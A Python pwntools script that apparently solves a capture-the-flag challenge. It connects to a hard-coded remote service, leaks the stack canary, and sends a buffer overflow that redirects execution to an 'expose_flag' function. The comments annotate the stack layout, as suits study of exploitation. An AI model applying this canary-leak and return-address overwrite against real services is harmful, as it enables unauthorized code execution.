from pwn import *

# Setup connection to servlet
ip = "158.37.65.130"
port = 7003
io = remote(ip, port)

# Read initial message
print(io.readline(timeout=.5))

# -4 | offset
#  0 | buffer
#  8 | Buffer
# 16 |
# 24 | Canary
# 32 |
# 40 | Return address

# figure out what the stack canary is
io.sendline(b'24')

# Read the response
response = io.readline(timeout=.5)
print(str(response, 'ascii'))

# Second line contains the hex at offset 24 (the canary)
canary = int(io.readline(timeout=.5),16)
print(hex(canary))

# First we fill the buffer (cyclic(16)),
# then we keep the 0x1 (p64(1)),
# Then we preserve the canary we read before (p64(canary))
# Keep the 0 after the canary (p64(0))
# Then we change the return address to 0x4011a6 (the address of expose_flag) +1 to skip the push instruction
# We know the address of expose flag by analysing the binary (readelf 2, objdump -t 2) or using GDB
io.sendline(cyclic(24)+p64(canary)+p64(0)+p64(0x4011a6+1))

io.shutdown('out')

# Read the output and get the flag
print(str(io.readall(timeout=.5)))
